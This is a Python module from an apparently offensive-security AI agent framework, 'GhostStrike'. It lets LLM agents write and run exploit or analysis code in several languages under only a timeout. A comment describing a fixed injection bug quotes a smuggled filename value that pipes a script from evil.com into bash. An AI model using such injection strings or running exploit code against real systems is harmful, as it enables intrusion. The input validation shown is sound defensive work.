"""
GhostStrike AI Engine — Code Runner
=====================================
Allows AI agents to write and execute exploit code or analysis scripts
on the fly in Python, Bash, PHP, Go, Perl, Ruby, or C.  Every execution
is sandboxed by a timeout; output is captured and returned to the LLM.

Copyright (C) 2026 Fouad Ailabouni. All rights reserved.
"""

from __future__ import annotations

import os
import re
import subprocess
import tempfile
from typing import Dict, Optional

TOOL_SCHEMA: Dict = {
    "type": "function",
    "function": {
        "name": "execute_code",
        "description": (
            "Write code to a temporary file and execute it. "
            "Use for exploit PoCs, custom parsers, payload generation, or analysis scripts. "
            "Prefer Python or Bash. Supports: python, bash, php, go, perl, ruby, c."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "code": {
                    "type": "string",
                    "description": "Complete source code to execute.",
                },
                "language": {
                    "type": "string",
                    "enum": ["python", "bash", "php", "go", "perl", "ruby", "c"],
                    "description": "Programming language.",
                    "default": "python",
                },
                "filename": {
                    "type": "string",
                    "description": "Base filename (no extension) for the script (default: phantomops_exec).",
                    "default": "phantomops_exec",
                },
                "timeout": {
                    "type": "integer",
                    "description": "Execution timeout in seconds (default 60).",
                    "default": 60,
                },
            },
            "required": ["code"],
        },
    },
}

_EXT_MAP: Dict[str, str] = {
    "python": "py", "bash": "sh", "php": "php",
    "go": "go", "perl": "pl", "ruby": "rb", "c": "c",
}

# List argv prefixes, not format strings -- see _execute()'s subprocess.run
# call, which appends the script path as a separate argv element rather
# than interpolating it into a shell=True string.
_EXEC_CMD: Dict[str, list] = {
    "python": ["python3"],
    "bash":   ["bash"],
    "php":    ["php"],
    "perl":   ["perl"],
    "ruby":   ["ruby"],
}

_SAFE_FILENAME_RE = re.compile(r"^[A-Za-z0-9_-]+$")


class CodeRunner:
    """
    Write-and-run code executor for GhostStrike AI agents.

    Compiled languages (Go, C) are built in a temp dir then executed.
    Interpreted languages are run directly.  All output is captured
    and returned as a string.
    """

    def __init__(self, output_callback=None) -> None:
        self._output_cb = output_callback

    def run(
        self,
        code: str,
        language: str = "python",
        filename: str = "phantomops_exec",
        timeout: int = 60,
    ) -> str:
        language = language.lower()
        ext      = _EXT_MAP.get(language, "py")

        # filename never needs to be anything but a plain identifier for
        # its legitimate purpose (naming a temp file); reject anything
        # else rather than let it reach a command string. Combined with
        # the list-argv subprocess calls below, this closes an injection
        # path that didn't even need the "code" execution feature itself
        # to abuse -- e.g. filename="x; curl evil.com/backdoor.sh | bash #"
        # previously ran as a second command alongside the intended one.
        if not _SAFE_FILENAME_RE.match(filename):
            return f"Invalid filename {filename!r}: only letters, digits, '_', and '-' are allowed."

        with tempfile.TemporaryDirectory(prefix="phantomops_code_") as tmpdir:
            script_path = os.path.join(tmpdir, f"{filename}.{ext}")
            with open(script_path, "w", encoding="utf-8") as fh:
                fh.write(code)

            try:
                output = self._execute(language, script_path, tmpdir, timeout)
            except Exception as exc:
                output = f"Execution error: {exc}"

        if self._output_cb:
            self._output_cb(output)

        header = f"[Code Execution: {language} | {filename}.{ext}]\n{'─'*50}\n"
        return header + output

    # ── Language-specific execution ───────────────────────────────────────────

    def _execute(
        self, language: str, script_path: str, workdir: str, timeout: int
    ) -> str:
        # cmd is always a list (argv), never a shell=True string.
        if language in _EXEC_CMD:
            cmd = _EXEC_CMD[language] + [script_path]
        elif language == "go":
            cmd = self._build_go(script_path, workdir)
            if isinstance(cmd, str):
                return cmd  # error message
        elif language == "c":
            cmd = self._build_c(script_path, workdir)
            if isinstance(cmd, str):
                return cmd  # error message
        else:
            return f"Unsupported language: {language}"

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=timeout, cwd=workdir,
            )
            out = result.stdout
            if result.stderr.strip():
                out += "\n[stderr]\n" + result.stderr
            if result.returncode != 0:
                out += f"\n[exit code: {result.returncode}]"
            return out or "(no output)"
        except subprocess.TimeoutExpired:
            return f"Error: execution timed out after {timeout}s."

    def _build_go(self, script_path: str, workdir: str):
        mod_init = subprocess.run(
            ["go", "mod", "init", "phantomops_exec"],
            cwd=workdir, capture_output=True, text=True,
        )
        if mod_init.returncode != 0:
            return f"Error (go mod init): {mod_init.stderr}"
        return ["go", "run", script_path]

    def _build_c(self, script_path: str, workdir: str):
        binary = os.path.join(workdir, "phantomops_exec_bin")
        compile_res = subprocess.run(
            ["gcc", script_path, "-o", binary, "-lm"],
            cwd=workdir, capture_output=True, text=True,
        )
        if compile_res.returncode != 0:
            return f"Error (gcc): {compile_res.stderr}"
        return [binary]
